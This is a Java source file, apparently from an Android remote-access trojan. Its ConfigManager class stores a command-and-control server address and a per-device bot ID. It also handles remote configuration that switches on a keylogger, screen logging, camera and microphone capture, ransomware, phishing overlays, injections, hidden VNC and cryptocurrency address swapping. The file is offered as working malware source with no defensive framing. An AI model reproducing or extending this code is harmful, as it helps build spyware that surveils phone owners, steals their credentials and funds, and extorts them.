package com.xrc.system.core;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class ConfigManager {
    private static final String TAG = Constants.TAG + ":Config";
    private static ConfigManager instance;
    private final SharedPreferences prefs;
    private final CryptoManager crypto;

    private ConfigManager(Context ctx) {
        this.prefs = ctx.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE);
        this.crypto = new CryptoManager();
        initDefaults();
    }

    public static synchronized ConfigManager get(Context ctx) {
        if (instance == null) {
            instance = new ConfigManager(ctx.getApplicationContext());
        }
        return instance;
    }

    private void initDefaults() {
        if (!prefs.contains(Constants.PREF_FIRST_LAUNCH)) {
            setBoolean(Constants.PREF_FIRST_LAUNCH, true);
            setString(Constants.PREF_C2_SERVER, Constants.DEFAULT_C2);
            setString(Constants.PREF_AES_KEY, crypto.generateAESKey());
            setString(Constants.PREF_BOT_ID, generateBotId());
        }
    }

    private String generateBotId() {
        String seed = System.currentTimeMillis() + android.os.Build.SERIAL + android.os.Build.BOARD;
        return crypto.hashSHA256(seed).substring(0, 16);
    }

    public void setString(String key, String value) {
        try {
            String enc = crypto.encryptAES(value, getAesKey());
            prefs.edit().putString(key, enc).apply();
        } catch (Exception e) {
            Log.e(TAG, "setString failed: " + key, e);
            prefs.edit().putString(key, value).apply();
        }
    }

    public String getString(String key, String def) {
        try {
            String enc = prefs.getString(key, null);
            if (enc == null) return def;
            String dec = crypto.decryptAES(enc, getAesKey());
            return dec != null ? dec : def;
        } catch (Exception e) {
            Log.e(TAG, "getString failed: " + key, e);
            return prefs.getString(key, def);
        }
    }

    public void setBoolean(String key, boolean value) {
        prefs.edit().putBoolean(key, value).apply();
    }

    public boolean getBoolean(String key, boolean def) {
        return prefs.getBoolean(key, def);
    }

    public void setInt(String key, int value) {
        prefs.edit().putInt(key, value).apply();
    }

    public int getInt(String key, int def) {
        return prefs.getInt(key, def);
    }

    public String getBotId() {
        return getString(Constants.PREF_BOT_ID, "unknown");
    }

    public String getC2Server() {
        return getString(Constants.PREF_C2_SERVER, Constants.DEFAULT_C2);
    }

    public void setC2Server(String url) {
        setString(Constants.PREF_C2_SERVER, url);
    }

    public String getAesKey() {
        String raw = prefs.getString(Constants.PREF_AES_KEY, null);
        if (raw == null) {
            String key = crypto.generateAESKey();
            prefs.edit().putString(Constants.PREF_AES_KEY, key).apply();
            return key;
        }
        return raw;
    }

    public void applyRemoteConfig(JSONObject cfg) {
        try {
            if (cfg.has("c2_server")) {
                setC2Server(cfg.getString("c2_server"));
            }
            if (cfg.has("keylogger")) {
                setBoolean("keylogger_enabled", cfg.getBoolean("keylogger"));
            }
            if (cfg.has("screenlogger")) {
                setBoolean("screenlogger_enabled", cfg.getBoolean("screenlogger"));
            }
            if (cfg.has("camera")) {
                setBoolean("camera_enabled", cfg.getBoolean("camera"));
            }
            if (cfg.has("microphone")) {
                setBoolean("mic_enabled", cfg.getBoolean("microphone"));
            }
            if (cfg.has("ransomware")) {
                setBoolean("ransomware_enabled", cfg.getBoolean("ransomware"));
            }
            if (cfg.has("phishlets")) {
                setString("active_phishlets", cfg.getJSONArray("phishlets").toString());
            }
            if (cfg.has("injections")) {
                setString("active_injections", cfg.getJSONArray("injections").toString());
            }
            if (cfg.has("hidden_vnc")) {
                setBoolean("vnc_enabled", cfg.getBoolean("hidden_vnc"));
            }
            if (cfg.has("crypto_swap")) {
                setBoolean("crypto_swap_enabled", cfg.getBoolean("crypto_swap"));
            }
            Log.d(TAG, "Remote config applied");
        } catch (JSONException e) {
            Log.e(TAG, "Config parse failed", e);
        }
    }

    public JSONObject getDeviceConfig() {
        JSONObject cfg = new JSONObject();
        try {
            cfg.put("bot_id", getBotId());
            cfg.put("c2", getC2Server());
            cfg.put("keylogger", getBoolean("keylogger_enabled", true));
            cfg.put("screenlogger", getBoolean("screenlogger_enabled", true));
            cfg.put("camera", getBoolean("camera_enabled", true));
            cfg.put("microphone", getBoolean("mic_enabled", true));
            cfg.put("ransomware", getBoolean("ransomware_enabled", false));
            cfg.put("vnc", getBoolean("vnc_enabled", false));
            cfg.put("crypto_swap", getBoolean("crypto_swap_enabled", false));
        } catch (JSONException e) {
            Log.e(TAG, "Config export failed", e);
        }
        return cfg;
    }
}
